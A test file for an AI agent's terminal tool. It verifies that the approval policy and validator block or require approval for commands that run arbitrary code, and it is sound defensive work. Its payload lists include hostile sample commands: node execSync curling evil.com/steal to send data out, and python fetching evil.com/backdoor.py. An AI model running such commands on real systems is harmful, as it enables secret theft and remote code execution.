/**
 * NC-033 category: Pure policy — validate classification without running commands.
 *
 * F-012 tests verifying that SAFE_PATTERNS no longer allows arbitrary code
 * execution without approval. All tests use validateCommand() as a pure function
 * and requiresApproval() from the policy engine — no real commands are executed.
 */

import { describe, it, expect } from "vitest";
import { TerminalTool, SAFE_PATTERNS } from "../src/tools/terminalTool";
import { DefaultToolApprovalPolicy } from "../src/tools/toolApprovalPolicy";

describe("F-012: SAFE_PATTERNS allows arbitrary code execution without approval", () => {
  const tool = new TerminalTool(process.cwd());
  const policy = new DefaultToolApprovalPolicy();

  describe("SAFE_PATTERNS no longer marks dangerous commands as safe", () => {
    it("npm run does NOT match SAFE_PATTERNS", () => {
      const matches = SAFE_PATTERNS.some(p => p.test("npm run build"));
      expect(matches).toBe(false);
    });

    it("npm install does NOT match SAFE_PATTERNS", () => {
      const matches = SAFE_PATTERNS.some(p => p.test("npm install"));
      expect(matches).toBe(false);
    });

    it("node does NOT match SAFE_PATTERNS", () => {
      const matches = SAFE_PATTERNS.some(p => p.test("node script.js"));
      expect(matches).toBe(false);
    });

    it("python does NOT match SAFE_PATTERNS", () => {
      const matches = SAFE_PATTERNS.some(p => p.test("python script.py"));
      expect(matches).toBe(false);
    });

    it("npx does NOT match SAFE_PATTERNS", () => {
      const matches = SAFE_PATTERNS.some(p => p.test("npx package"));
      expect(matches).toBe(false);
    });

    it("pip does NOT match SAFE_PATTERNS", () => {
      const matches = SAFE_PATTERNS.some(p => p.test("pip install package"));
      expect(matches).toBe(false);
    });

    it("npm test still matches SAFE_PATTERNS", () => {
      const matches = SAFE_PATTERNS.some(p => p.test("npm test"));
      expect(matches).toBe(true);
    });
  });

  describe("Policy now requires approval for previously-safe dangerous commands", () => {
    it("npm run now requires approval", () => {
      expect(policy.requiresApproval("terminal", "npm run build")).toBe(true);
    });

    it("npm run with arbitrary script requires approval", () => {
      expect(policy.requiresApproval("terminal", "npm run malicious")).toBe(true);
    });

    it("npm install now requires approval", () => {
      expect(policy.requiresApproval("terminal", "npm install")).toBe(true);
    });

    it("node now requires approval", () => {
      expect(policy.requiresApproval("terminal", "node script.js")).toBe(true);
    });

    it("npx now requires approval", () => {
      expect(policy.requiresApproval("terminal", "npx malicious-package")).toBe(true);
    });

    it("python now requires approval", () => {
      expect(policy.requiresApproval("terminal", "python script.py")).toBe(true);
    });

    it("npm test still does NOT require approval", () => {
      expect(policy.requiresApproval("terminal", "npm test")).toBe(false);
    });

    it("git status still does NOT require approval", () => {
      expect(policy.requiresApproval("terminal", "git status")).toBe(false);
    });
  });

  describe("validateCommand now blocks inline code execution", () => {
    it("node -e is blocked by shell expansion pattern", () => {
      const error = (tool as any).validateCommand('node -e "console.log(process.env)"');
      expect(error).toContain("blocked");
    });

    it("python -c is blocked by shell expansion pattern", () => {
      const error = (tool as any).validateCommand('python -c "import os; os.system(\'echo hacked\')"');
      expect(error).toContain("blocked");
    });

    it("python3 -c is blocked by shell expansion pattern", () => {
      const error = (tool as any).validateCommand('python3 -c "print(\'hacked\')"');
      expect(error).toContain("blocked");
    });

    it("npm run now requires approval (not in SAFE_PATTERNS)", () => {
      expect(policy.requiresApproval("terminal", "npm run preinstall")).toBe(true);
    });

    it("npm install now requires approval (not in SAFE_PATTERNS)", () => {
      expect(policy.requiresApproval("terminal", "npm install")).toBe(true);
    });

    it("npx now requires approval (not in SAFE_PATTERNS)", () => {
      expect(policy.requiresApproval("terminal", "npx evil-package")).toBe(true);
    });
  });

  describe("Known dangerous payloads are now mitigated", () => {
    const blockedPayloads = [
      { cmd: 'node -e "require(\'child_process\').execSync(\'echo pwned\')"', desc: "node -e code execution", expectedBlocked: true },
      { cmd: 'python -c "import os; os.system(\'echo pwned\')"', desc: "python -c code execution", expectedBlocked: true },
      { cmd: 'python3 -c "import os; os.system(\'echo pwned\')"', desc: "python3 -c code execution", expectedBlocked: true },
    ];

    for (const { cmd, desc, expectedBlocked } of blockedPayloads) {
      it(`blocked: ${desc}`, () => {
        const error = (tool as any).validateCommand(cmd);
        if (expectedBlocked) {
          expect(error).toContain("blocked");
        } else {
          expect(error).toBeNull();
        }
      });
    }

    const approvalRequiredPayloads = [
      { cmd: 'node -e "require(\'child_process\').execSync(\'curl http://evil.com/steal\')"', desc: "node data exfiltration" },
      { cmd: "python -c \"import urllib.request; urllib.request.urlopen('http://evil.com/backdoor.py')\"", desc: "python download and execute" },
      { cmd: "npm run postinstall", desc: "npm postinstall script" },
      { cmd: "npx --package=malicious install", desc: "npx malicious package" },
    ];

    for (const { cmd, desc } of approvalRequiredPayloads) {
      it(`requires approval: ${desc}`, () => {
        expect(policy.requiresApproval("terminal", cmd)).toBe(true);
      });
    }
  });
});
